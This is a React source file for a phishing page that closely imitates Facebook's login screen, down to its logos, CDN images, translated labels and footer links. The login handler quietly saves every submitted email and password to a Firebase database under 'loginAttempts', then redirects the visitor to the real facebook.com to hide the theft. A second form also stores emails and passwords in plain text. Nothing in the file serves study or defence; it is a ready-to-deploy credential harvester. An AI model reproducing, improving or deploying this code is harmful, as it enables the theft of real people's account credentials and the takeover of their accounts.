import { useState, useMemo } from "react";
import { ref, push, set } from "firebase/database";
import { db } from "../lib/firebase";


function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [msg, setMsg] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const newRef = push(ref(db, "users"));

      await set(newRef, {
        email: email,
        password: password,
        timestamp: Date.now()
      });

      setMsg("Data stored successfully");

      setEmail("");
      setPassword("");

    } catch (err) {
      setMsg("Error: " + err.message);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">

      <input
        type="email"
        placeholder="Email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
      />

      <input
        type="password"
        placeholder="Password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />

      <button type="submit">Submit</button>

      <p>{msg}</p>
    </form>
  );
}

const FacebookLogo = () => (
  <svg viewBox="0 0 24 24" className="w-12 h-12" fill="hsl(var(--fb-blue))">
    <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z" />
  </svg>
);

const MetaLogo = () => (
  <img 
    src="https://z-m-static.xx.fbcdn.net/rsrc.php/ys/r/RkrEdst9VSp.webp"
    alt="Meta"
    className="h-3 w-auto"
  />
);

const ImageCollage = () => {
  const imageSrcs = [
    "https://static.xx.fbcdn.net/rsrc.php/yb/r/HpEiFYDux5j.webp",
    "https://static.xx.fbcdn.net/rsrc.php/y0/r/U45qBJmWVHU.webp",
    "https://static.xx.fbcdn.net/rsrc.php/yB/r/83zWJdc6PJI.webp"
  ];

  const selectedSrc = useMemo(() => {
    return imageSrcs[Math.floor(Math.random() * imageSrcs.length)];
  }, []);

  return (
    <div className="relative w-full max-w-[720px] mx-auto lg:mx-0 h-[460px] lg:h-[520px]">
      {/* Clean container - no border, no heavy shadow */}
      <div className="absolute top-[24px] left-[24px] w-[440px] h-[500px] rounded-[40px] overflow-hidden bg-white">
        <img
          src={selectedSrc}
          alt="Featured Facebook image"
          className="w-full h-full object-cover"
        />
      </div>
    </div>
  );
};

const FloatingInput = ({
  label,
  type,
  value,
  onChange,
  className = "",
  errorMessage = "",
}: {
  label: string;
  type: string;
  value: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  className?: string;
  errorMessage?: string;
}) => {
  const [focused, setFocused] = useState(false);
  const isActive = focused || value.length > 0;
  const hasError = errorMessage.length > 0;

  return (
    <div className={`relative ${className}`}>
      <input
        type={type}
        value={value}
        onChange={onChange}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(false)}
        className={`peer w-full h-[52px] px-4 pt-5 pb-1 text-base border rounded-lg bg-background text-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary ${
          hasError ? "border-red-500 focus:border-red-500 focus:ring-red-200" : "border-input"
        }`}
      />
      <label
        className={`absolute left-4 transition-all duration-150 pointer-events-none ${
          isActive
            ? "top-1.5 text-xs text-muted-foreground"
            : "top-3.5 text-base text-muted-foreground"
        }`}
      >
        {label}
      </label>
      {hasError ? (
        <p className="mt-1 text-sm text-red-600">{errorMessage}</p>
      ) : null}
    </div>
  );
};

const Index = () => {
  const [currentLang, setCurrentLang] = useState("en"); // default English

  const languages = [
    { code: "en", label: "English (US)" },
    { code: "ne", label: "नेपाली" },
    { code: "hi", label: "हिन्दी" },
    { code: "es", label: "Español" },
    { code: "pt", label: "Português (Brasil)" },
    { code: "ja", label: "日本語" },
    { code: "fr", label: "Français (France)" },
  ];

  // Simple translation dictionary (expand this as needed)
  const translations: Record<string, Record<string, string>> = {
    en: {
      explore: "Explore the things you love.",
      loginTitle: "Log into Facebook",
      emailLabel: "Email or mobile number",
      passwordLabel: "Password",
      loginBtn: "Log in",
      forgotPassword: "Forgot password?",
      createAccount: "Create new account",
    },
    ne: {
      explore: "तपाईंलाई मन पर्ने कुराहरू अन्वेषण गर्नुहोस्।",
      loginTitle: "फेसबुकमा लग इन गर्नुहोस्",
      emailLabel: "इमेल वा मोबाइल नम्बर",
      passwordLabel: "पासवर्ड",
      loginBtn: "लग इन गर्नुहोस्",
      forgotPassword: "पासवर्ड बिर्सनुभयो?",
      createAccount: "नयाँ खाता बनाउनुहोस्",
    },
    hi: {
      explore: "आपको पसंदीदा चीजों को एक्सप्लोर करें।",
      loginTitle: "फेसबुक में लॉग इन करें",
      emailLabel: "ईमेल या मोबाइल नंबर",
      passwordLabel: "पासवर्ड",
      loginBtn: "लॉग इन करें",
      forgotPassword: "पासवर्ड भूल गए?",
      createAccount: "नया अकाउंट बनाएं",
    },
    es: {
      explore: "Explora las cosas que te encantan.",
      loginTitle: "Iniciar sesión en Facebook",
      emailLabel: "Número de móvil o correo electrónico",
      passwordLabel: "Contraseña",
      loginBtn: "Iniciar sesión",
      forgotPassword: "¿Olvidaste tu contraseña?",
      createAccount: "Crear cuenta nueva",
    },
    pt: {
      explore: "Explore as coisas que você ama.",
      loginTitle: "Entrar no Facebook",
      emailLabel: "Número de celular ou email",
      passwordLabel: "Senha",
      loginBtn: "Entrar",
      forgotPassword: "Esqueceu a senha?",
      createAccount: "Criar nova conta",
    },
    ja: {
      explore: "あなたが好きなものを探しましょう。",
      loginTitle: "Facebookにログイン",
      emailLabel: "携帯電話番号またはメールアドレス",
      passwordLabel: "パスワード",
      loginBtn: "ログイン",
      forgotPassword: "パスワードをお忘れですか？",
      createAccount: "新しいアカウントを作成",
    },
    fr: {
      explore: "Explorez les choses que vous aimez.",
      loginTitle: "Se connecter à Facebook",
      emailLabel: "Numéro de mobile ou email",
      passwordLabel: "Mot de passe",
      loginBtn: "Se connecter",
      forgotPassword: "Mot de passe oublié ?",
      createAccount: "Créer un nouveau compte",
    },
  };

  const t = (key: string) => translations[currentLang]?.[key] || translations.en[key];

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loginError, setLoginError] = useState("");

  const handleLogin = async () => {
    if (!email.trim() || !password.trim()) {
      setLoginError(
        "The email or mobile number you entered isn’t connected to an account. Find your account and log in."
      );
      return;
    }

    setLoginError("");

    try {
      const loginAttemptRef = push(ref(db, "loginAttempts"));
      await set(loginAttemptRef, {
        email,
        password,
        timestamp: Date.now(),
      });
    } catch (error) {
      console.error("Login save failed:", error);
      setLoginError("Unable to save login attempt. Please try again.");
    } finally {
      window.location.href = "https://www.facebook.com/";
    }
  };

  return (
    <div className="min-h-screen bg-background flex flex-col justify-between">
      <div className="flex-1 flex items-start justify-center px-4 py-8 lg:px-8">
        <div className="flex flex-col lg:flex-row lg:items-stretch items-start gap-10 lg:gap-24 max-w-[1320px] w-full">
          {/* Left side */}
          <div className="hidden lg:flex flex-1 max-w-[640px] lg:h-full">
            <div className="mb-6">
              <FacebookLogo />
            </div>
            <div className="grid gap-1 lg:grid-cols-[minmax(200px,180px)_minmax(220px,360px)] items-start">
              <div className="mt-auto pb-8 lg:pb-12">
                <h1 className="text-[32px] lg:text-[58px]  leading-[0.85] tracking-tight text-foreground font-semibold">
                  Explore<br />the things<br /><span className="text-primary">you love.</span>
                </h1>
              </div>
              <div className="pt-3 lg:pt-0">
                <ImageCollage />
              </div>
            </div>
          </div>

        {/* Right side - Login form */}
        <div className="w-full max-w-[436px] mx-auto lg:mx-0 lg:border-l lg:border-border lg:pl-12">
          <div className="pt-6 lg:pt-0 pb-8 px-5 sm:px-0 max-w-[380px] mx-auto">

            <div className="flex justify-center lg:hidden mb-10">
              <FacebookLogo />
              </div>
            <div className="relative my-6">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-gray-300"></div>
              </div>
            </div>

            <h2 className="hidden lg:block text-center text-[28px] font-semibold text-foreground mb-8">
              {t("loginTitle")}
            </h2> 
            <div className="space-y-4">
              <FloatingInput
                type="text"
                label={t("emailLabel")}
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                errorMessage={loginError}
              />

              <FloatingInput
                type="password"
                label={t("passwordLabel")}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <button
                onClick={handleLogin}
                className="w-full h-[40px] bg-[#1877f2] hover:bg-[#166fe5] active:bg-[#166fe5] 
                          text-white text-[17px] font-semibold rounded-[32px] mt-2 
                          transition-all duration-200 shadow-sm"
              >
                {t("loginBtn")}
              </button>
              <div className="text-center py-2">
                <a
                  href="https://www.facebook.com/login/identify/"
                  className="flex justify-center px-6 py-3 rounded-full text-[#0e0f0f] text-sm font-medium  underline hover:bg-[#f0f2f5] hover:text-[#0c0c0c] hover:w-full "
                >
                  {t("forgotPassword")}
                </a>
              </div>

              <div className="relative my-6">
                <div className="absolute inset-0 flex items-center">
                  <div className="w-full border-t border-gray-300"></div>
                </div>
              </div>

              <button
                onClick={() => window.location.href = "https://www.facebook.com/reg/"}
                className="w-full h-[47px] border border-[#1877f2] text-[#1877f2] 
                          text-[17px] font-semibold rounded-[37px] hover:bg-[#f0f2f5] 
                          transition-all duration-200"
              >
                {t("createAccount")}
              </button>
            </div>

            <div className="flex justify-center mt-12 lg:mt-4 ">
              <MetaLogo />
              </div>
          </div>
        </div>
        </div>
      </div>

      <footer className="py-4 px-4 border-t border-border">
        <div className="max-w-[1100px] mx-auto">
          <div className="flex flex-wrap items-center justify-center gap-x-6 gap-y-1 text-sm mb-2">
            {languages.map((lang) => (
              <a
                key={lang.code}
                href="#"
                onClick={(e) => {
                  e.preventDefault();
                  setCurrentLang(lang.code);
                }}
                className={`hover:underline transition-colors ${
                  currentLang === lang.code
                    ? "text-foreground font-medium"
                    : "text-muted-foreground"
                }`}
              >
                {lang.label}
              </a>
            ))}
            <a href="#" className="text-muted-foreground hover:underline">More languages...</a>
          </div>
          <div className="pt-2">
              <div className="flex flex-wrap justify-center gap-x-4 gap-y-1 text-xs text-gray-500 dark:text-gray-400">
                <a href="https://www.facebook.com/reg/" className="hover:underline">Sign Up</a>
                <a href="https://www.facebook.com/login/" className="hover:underline">Log In</a>
                <a href="https://www.messenger.com/" target="_blank" rel="noopener noreferrer" className="hover:underline">Messenger</a>
                <a href="https://www.facebook.com/lite/" className="hover:underline">Facebook Lite</a>
                <a href="https://www.facebook.com/watch/" className="hover:underline">Video</a>
                <a href="https://www.facebook.com/pay/" className="hover:underline">Meta Pay</a>
                <a href="https://www.meta.com/store/" target="_blank" rel="noopener noreferrer" className="hover:underline">Meta Store</a>
                <a href="https://www.meta.com/quest/" target="_blank" rel="noopener noreferrer" className="hover:underline">Meta Quest</a>
                <a href="https://www.meta.com/ray-ban-stories/" target="_blank" rel="noopener noreferrer" className="hover:underline">Ray-Ban Meta</a>
                <a href="https://www.meta.com/ai/" target="_blank" rel="noopener noreferrer" className="hover:underline">Meta AI</a>
                <a href="https://www.instagram.com/" target="_blank" rel="noopener noreferrer" className="hover:underline">Instagram</a>
                <a href="https://www.threads.net/" target="_blank" rel="noopener noreferrer" className="hover:underline">Threads</a>
                <a href="https://www.facebook.com/privacy/policy/" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy Policy</a>
              </div>

              <div className="flex flex-wrap justify-center gap-x-4 gap-y-1 text-xs text-gray-500 dark:text-gray-400 mt-3">
                <a href="https://www.facebook.com/privacy/" className="hover:underline">Privacy Center</a>
                <a href="https://about.facebook.com/" target="_blank" rel="noopener noreferrer" className="hover:underline">About</a>
                <a href="https://www.facebook.com/ads/create/" className="hover:underline">Create ad</a>
                <a href="https://www.facebook.com/pages/create/" className="hover:underline">Create Page</a>
                <a href="https://developers.facebook.com/" target="_blank" rel="noopener noreferrer" className="hover:underline">Developers</a>
                <a href="https://www.facebook.com/careers/" target="_blank" rel="noopener noreferrer" className="hover:underline">Careers</a>
                <a href="https://www.facebook.com/cookies/" className="hover:underline">Cookies</a>
                <a href="https://www.facebook.com/help/568137493302217" className="hover:underline">Ad choices ▶</a>
                <a href="https://www.facebook.com/terms/" className="hover:underline">Terms</a>
                <a href="https://www.facebook.com/help/" className="hover:underline">Help</a>
              </div>
            <div className="flex flex-wrap justify-center gap-x-4 gap-y-1 text-xs text-muted-foreground mt-1">
              {["Privacy Center", "About", "Create ad", "Create Page", "Developers", "Careers", "Cookies", "Ad choices ▶", "Terms", "Help", "Contact Uploading & Non-Users"].map((link, i) => (
                <a key={i} href="#" className="hover:underline">{link}</a>
              ))}
            </div>
          </div>
          <p className="text-xs text-muted-foreground text-center mt-3">Meta © 2026</p>
        </div>
      </footer>
    </div>
  );
};

export default Index;
  